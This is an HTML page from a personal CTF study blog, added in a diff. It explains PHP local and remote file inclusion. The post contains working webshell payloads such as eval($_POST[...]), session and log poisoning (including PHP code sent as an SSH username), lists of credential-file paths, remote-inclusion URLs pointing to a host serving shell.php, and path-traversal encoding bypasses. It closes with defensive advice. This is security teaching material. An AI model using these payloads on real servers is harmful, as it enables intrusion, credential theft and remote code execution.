@@ -1,0 +1,868 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" href="/img/fav.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sl0th">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="文件包含0x01 简介及基本知识攻击方绕过了文件包含函数的参数过滤或限制，从而包含恶意文件，达到执行非预期代码的目的。 文件包含函数PHP中文件包含函数有以下四种： 1234require()require_once()include()include_once()    include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而req">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="http://sloth31.github.io/2022/03/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="Sl0th&#39;s Blog">
+<meta property="og:description" content="文件包含0x01 简介及基本知识攻击方绕过了文件包含函数的参数过滤或限制，从而包含恶意文件，达到执行非预期代码的目的。 文件包含函数PHP中文件包含函数有以下四种： 1234require()require_once()include()include_once()    include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而req">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-06T16:09:38.000Z">
+<meta property="article:modified_time" content="2024-07-03T16:10:16.222Z">
+<meta property="article:author" content="Sl0th">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>文件包含 | Sl0th&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sl0th&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件包含"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-07 00:09" pubdate>
+          2022年3月7日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">文件包含</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="0x01-简介及基本知识"><a href="#0x01-简介及基本知识" class="headerlink" title="0x01 简介及基本知识"></a>0x01 简介及基本知识</h2><p>攻击方绕过了文件包含函数的参数过滤或限制，从而包含恶意文件，达到执行非预期代码的目的。</p>
+<h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><p>PHP中文件包含函数有以下四种：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require</span>()<br><span class="hljs-keyword">require_once</span>()<br><span class="hljs-keyword">include</span>()<br><span class="hljs-keyword">include_once</span>()<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</li>
+<li><code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</li>
+<li>当利用这四大漏洞函数包含文件的时候，不论什么类型的文件，都会作为PHP脚本解析</li>
+</ul>
+</blockquote>
+<h3 id="敏感信息路径"><a href="#敏感信息路径" class="headerlink" title="敏感信息路径"></a>敏感信息路径</h3><p>Windows系统</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c:\boot.ini <span class="hljs-comment">// 查看系统版本</span><br>c:\windows\system32\inetsrv\MetaBase.xml <span class="hljs-comment">// IIS配置文件</span><br>c:\windows\repair\sam <span class="hljs-comment">// 存储Windows系统初次安装的密码</span><br>c:\ProgramFiles\mysql\my.ini <span class="hljs-comment">// MySQL配置</span><br>c:\ProgramFiles\mysql\data\mysql\user.MYD <span class="hljs-comment">// MySQL root密码</span><br>c:\windows\php.ini <span class="hljs-comment">// php 配置信息</span><br></code></pre></td></tr></table></figure>
+
+<p>Linux&#x2F;Unix系统</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">/etc/passwd <span class="hljs-comment">// 账户信息</span><br>/etc/shadow <span class="hljs-comment">// 账户密码文件</span><br>/usr/local/app/apache2/conf/httpd.conf <span class="hljs-comment">// Apache2默认配置文件</span><br>/usr/local/app/apache2/conf/extra/httpd-vhost.conf <span class="hljs-comment">// 虚拟网站配置</span><br>/usr/local/app/php5/lib/php.ini <span class="hljs-comment">// PHP相关配置</span><br>/etc/httpd/conf/httpd.conf <span class="hljs-comment">// Apache配置文件</span><br>/etc/my.conf <span class="hljs-comment">// mysql 配置文件</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="0x02-常见Bypass"><a href="#0x02-常见Bypass" class="headerlink" title="0x02 常见Bypass"></a>0x02 常见Bypass</h1><h2 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><p>可获取session存储位置</p>
+<h3 id="方式："><a href="#方式：" class="headerlink" title="方式："></a>方式：</h3><ol>
+<li><p>phpinfo中<code>session.save_path</code></p>
+<blockquote>
+<p>第二列是<code>Local Value</code>（局部变量），第三列是<code>Master Value</code>（主变量）。其中<code>Master Value</code>是PHP.ini文件中的内容。<code>Local value</code>是当前目录中的设置，这个值会覆盖<code>Master Value</code>中对应的值。</p>
+</blockquote>
+</li>
+<li><p>猜测默认路径以及常见路径</p>
+<ul>
+<li>linux下默认存储在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session</li>
+<li><code>/var/lib/php/sess_PHPSESSID</code></li>
+<li><code>/var/lib/php/sess_PHPSESSID</code></li>
+<li><code>/tmp/sess_PHPSESSID</code></li>
+<li><code>/tmp/sessions/sess_PHPSESSID</code></li>
+</ul>
+</li>
+</ol>
+<p>session可控</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$ctfs</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfs&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-variable">$ctfs</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取(一般是cookie中的PHPSESSID的值)</p>
+<p>单击右键——检查——存储——Cookie——PHPSESSID 就可以找到内容</p>
+<blockquote>
+<p>假设以上代码传参数ctfs&#x3D;test,则session文件内容为</p>
+<p><code>username|s:4:&quot;test&quot;</code></p>
+</blockquote>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>通过可控参数写入恶意代码到session文件，然后通过文件包含漏洞执行此恶意代码getshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//传马</span><br>session.php?ctfs=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//也可以写马</span><br>session.php?ctfs=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;data2.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php eval($_POST[123])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//利用文件包含漏洞解析该session文件</span><br>file.php?file=sess_83317220159fc31cd7023422f64bea1a<br></code></pre></td></tr></table></figure>
+
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a><strong>攻击步骤</strong></h3><ul>
+<li>将恶意代码写入session文件</li>
+<li>攻击者可以通过PHPinfo或者猜测到session存放的位置</li>
+<li>通过开发者模式可以获得文件名称</li>
+<li>通过本地文件包含漏洞可以解析session文件达到攻击的目的</li>
+</ul>
+<h2 id="00截断文件包含"><a href="#00截断文件包含" class="headerlink" title="%00截断文件包含"></a>%00截断文件包含</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul>
+<li>magic_quotes_gpc&#x3D;off</li>
+<li>PHP版本低于5.3.4(5.3.29复现失败,5.2.17成功 建议MAMP pro版本不要超过6.3.2)</li>
+</ul>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>截断的核心，就是 <code>chr(0)</code>这个字符。先说一下这个字符，这个字符不为空 <code>(Null)</code>，也不是空字符 <code>(&quot;&quot;)</code>，更不是空格。 当程序在输出含有 <code>chr(0)</code>变量时 <code>chr(0)</code>后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生。</p>
+<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>包含时，给文件名拼接上其余后缀，从而限制了读取文件的类型范围</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>	<span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.html&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>file.php?file=../../../../../../boot.ini%00</code></p>
+<p>%00截断后面”.html”内容，实际上包含boot.ini</p>
+</blockquote>
+<h2 id="路径长度截断文件包含"><a href="#路径长度截断文件包含" class="headerlink" title="路径长度截断文件包含"></a>路径长度截断文件包含</h2><p>可以输入超过最大路劲长度的目录，这样系统就会将后面的路径丢弃，导致拓展名截断</p>
+<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ul>
+<li>Windows下最大路径长度为256B</li>
+<li>Linux下最大路径长度为4096B(浏览器最多只能输入300多个字符，所以需要抓包)</li>
+</ul>
+<p>文件名后叠加<code>./</code> 不过不能超过此服务器的容量限制</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file.php?file=test.txt/./....././<br></code></pre></td></tr></table></figure>
+
+<h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><p>典型的日志文件包含：</p>
+<ul>
+<li>中间件日志文件包含</li>
+<li>ssh日志文件包含</li>
+</ul>
+<h3 id="中间件日志文件包含"><a href="#中间件日志文件包含" class="headerlink" title="中间件日志文件包含"></a>中间件日志文件包含</h3><p>利用条件：</p>
+<ul>
+<li>web中间件日志文件的存储位置已知，并且具有可读权限</li>
+</ul>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>由于访问网站下其他文件，不论是否访问成功，都会被写入日志文件，因此可以直接访问一句话木马，如</p>
+<ul>
+<li>访问 <code>http://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt;</code></li>
+<li>日志文件记录 <code>192.168.1.200 - - [09/Aug/2021:19:35:23 +0800] &quot;GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1&quot; 404 826....</code></li>
+</ul>
+<blockquote>
+<p>浏览器进行了URL编码，导致传入的代码不能正常使用<strong>可以通过bp抓包的方式写入恶意代码，这样不会被编码</strong></p>
+<p>Apache的中间件日志文件存在&#x2F;var&#x2F;log&#x2F;httpd&#x2F;目录下，文件名叫access_log</p>
+</blockquote>
+<h3 id="ssh日志文件包含"><a href="#ssh日志文件包含" class="headerlink" title="ssh日志文件包含"></a>ssh日志文件包含</h3><p>SSH日志文件包含的利用条件是：</p>
+<ul>
+<li>SSH日志路径已知，并且具有可读权限</li>
+</ul>
+<p>SSH日志文件的默认路径为<code>/var/log/auth.log</code></p>
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>ssh连接时将用户名设为恶意代码，写入成功后再包含即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;@192.168.1.1<br></code></pre></td></tr></table></figure>
+
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><h3 id="无限制远程文件包含"><a href="#无限制远程文件包含" class="headerlink" title="无限制远程文件包含"></a>无限制远程文件包含</h3><p>通过URL的形式包含到其他服务器上的文件，以及执行文件中的恶意代码</p>
+<p>条件</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span>=<span class="hljs-literal">on</span><br><span class="hljs-attr">allow_url_include</span>=<span class="hljs-literal">on</span><br></code></pre></td></tr></table></figure>
+
+<p>payload <code>http://www.abc.com/file.php?file=http://192.168.2.1/shell.php</code></p>
+<h3 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>].<span class="hljs-string">&quot;.html&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><ul>
+<li><p>可以在问号后面添加html字符串，问号后面的拓展名会被当做查询，从而绕过过滤<br><code>file.php?filename=http://192.168.2.1/shell.php?</code></p>
+</li>
+<li><p>可以在#后面添加HTML字符串，#会截断后面的拓展名，从而绕过拓展名过滤.#的URL编码为%23</p>
+<p><code>file.php?filename=http://192.168.2.1/shell.php%23</code></p>
+</li>
+<li><p>空格绕过</p>
+</li>
+</ul>
+<p>​    <code>file.php?filename=http://192.168.2.1/php.txt%20</code></p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>详见php伪协议学习笔记</p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>服务器端常常会对于..&#x2F;等做一些过滤，可以用一些编码来进行绕过。<br><strong>1.利用url编码</strong></p>
+<ul>
+<li>..&#x2F;<ul>
+<li>%2e%2e%2f</li>
+<li>..%2f</li>
+<li>%2e%2e&#x2F;</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+<li>..%5c</li>
+<li>%2e%2e\</li>
+</ul>
+</li>
+</ul>
+<p><strong>2.二次编码</strong></p>
+<ul>
+<li>..&#x2F;<ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+<p><strong>3.容器&#x2F;服务器的编码方式</strong></p>
+<ul>
+<li>..&#x2F;<ul>
+<li>..%c0%af<ul>
+<li>注：<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></li>
+</ul>
+</li>
+<li>%c0%ae%c0%ae&#x2F;<ul>
+<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
+<li>Apache Tomcat Directory Traversal(Apache Tomcat 目录遍历)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+<h2 id="遇到指定后缀的情况"><a href="#遇到指定后缀的情况" class="headerlink" title="遇到指定后缀的情况"></a>遇到指定后缀的情况</h2><p>接着考虑指定后缀的情况。测试代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;/test/test.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="解决：URL"><a href="#解决：URL" class="headerlink" title="解决：URL"></a><strong>解决：URL</strong></h3><p>url格式</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">protocol:<span class="hljs-regexp">//</span>hostname[:port]<span class="hljs-regexp">/path/</span>[;parameters][?query]<span class="hljs-comment">#fragment</span><br></code></pre></td></tr></table></figure>
+
+<p>在远程文件包含漏洞（RFI）中，可以利用query（?）或fragment（#）来绕过后缀限制。那么利用条件就需要是：</p>
+<ol>
+<li><code>allow_url_fopen = On</code></li>
+<li><code>allow_url_include = On</code></li>
+</ol>
+<h3 id="姿势一：query（-）"><a href="#姿势一：query（-）" class="headerlink" title="姿势一：query（?）"></a><strong>姿势一：query（?）</strong></h3><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=http:<span class="hljs-comment">//remoteaddr/remoteinfo.txt?</span><br></code></pre></td></tr></table></figure>
+
+<p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt?/test/test.php</code><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。</p>
+<h3 id="姿势二：fragment（-23-）"><a href="#姿势二：fragment（-23-）" class="headerlink" title="姿势二：fragment（#(%23)）"></a><strong>姿势二：fragment（#(%23)）</strong></h3><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=http:<span class="hljs-comment">//remoteaddr/remoteinfo.txt%23</span><br></code></pre></td></tr></table></figure>
+
+<p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt#/test/test.php</code><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。</p>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><ol>
+<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了<code>open_basedir</code>，则会包含失败。所以PHP 中使用<code>open_basedir</code>配置限制访问在指定的区域。</li>
+<li>做好文件的权限管理。</li>
+<li>对可以包含的文件进行限制，可以采用白名单的方式，或设置可以包含的目录。</li>
+<li>对危险字符进行过滤，比如过滤<code>.</code>（点）<code>/</code>（反斜杠）<code>\</code>（反斜杠）等特殊字符。</li>
+<li>尽量将allow_url_fopen和allow_url_include配置为off，不过像有些伪协议还是能使用，不过能尽量off还是off吧。</li>
+<li>尽量不使用动态包含等等</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件包含</div>
+      <div>http://sloth31.github.io/2022/03/07/文件包含/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sl0th</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年3月7日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                <i class="iconfont icon-sa"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/04/01/SSRF%E5%AD%A6%E4%B9%A0/" title="SSRF学习">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSRF学习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">
+                        <span class="hidden-mobile">文件上传</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
